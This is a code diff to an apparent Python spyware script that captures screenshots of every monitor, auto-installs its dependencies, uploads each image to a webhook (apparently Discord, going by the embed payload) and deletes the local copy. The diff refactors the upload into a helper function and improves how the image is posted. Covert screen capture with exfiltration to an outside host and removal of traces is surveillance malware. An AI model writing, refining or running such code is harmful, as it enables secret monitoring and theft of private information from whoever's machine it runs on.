@@ -33,6 +33,11 @@ try:
 except ImportError:
     install('pywin32')
     import win32con
+try:
+    from PIL import Image
+except ImportError:
+    install('Pillow')
+    from PIL import Image
 def capture_screenshot(monitor):
     hwin = win32gui.GetDesktopWindow()
     width = monitor.width
@@ -48,7 +53,6 @@ def capture_screenshot(monitor):
     memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
     bmpinfo = bmp.GetInfo()
     bmpstr = bmp.GetBitmapBits(True)
-    from PIL import Image
     img = Image.frombuffer(
         'RGB',
         (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
@@ -66,14 +70,18 @@ def capture_screenshots():
         filename = f'screenshot_screen_{i}.png'
         screenshot.save(filename)
         file_paths.append(filename)
-        with open(filename, 'rb') as f:
-            response = requests.post(
-                webhook_url,
-                files={"file": f}
-            )
+        send_screenshot_to_webhook(filename)
         if os.path.exists(filename):
             os.remove(filename)
     return file_paths
+def send_screenshot_to_webhook(filename):
+    with open(filename, 'rb') as f:
+        response = requests.post(
+            webhook_url,
+            files={"file": (filename, f, 'image/png')},
+            data={"payload_json": '{"embeds": [{"color": 9109504, "image": {"url": "attachment://' + filename + '"}}]}'}
+        )
+        response.raise_for_status()
 def main():
     capture_screenshots()
 if __name__ == "__main__":
